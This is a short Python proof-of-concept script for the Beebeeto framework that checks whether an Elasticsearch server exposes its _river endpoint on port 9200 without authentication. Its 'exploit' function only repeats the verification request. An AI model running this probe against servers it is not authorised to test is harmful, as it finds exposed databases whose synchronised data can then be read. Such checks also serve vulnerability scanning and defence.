#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests
import urlparse

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0100',
            'name': 'Elasticsearch _river 未授权访问漏洞 POC',
            'author': 'foundu',
            'create_date': '2015-05-14',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [9200],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Elasticsearch',
            'vul_version': ['*'],
            'type': 'Privilege Escalation',
            'tag': ['Elasticsearch漏洞', '未授权访问漏洞', '信息泄露漏洞'],
            'desc': 'elasticsearch在安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）',
            'references': ['http://zone.wooyun.org/content/20297',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        target = urlparse.urlparse(args['options']['target'])
        verify_url = '%s://%s:9200/_river/_search' % (target.scheme, target.netloc)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code == 200 and '_river' in req.content and 'type' in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())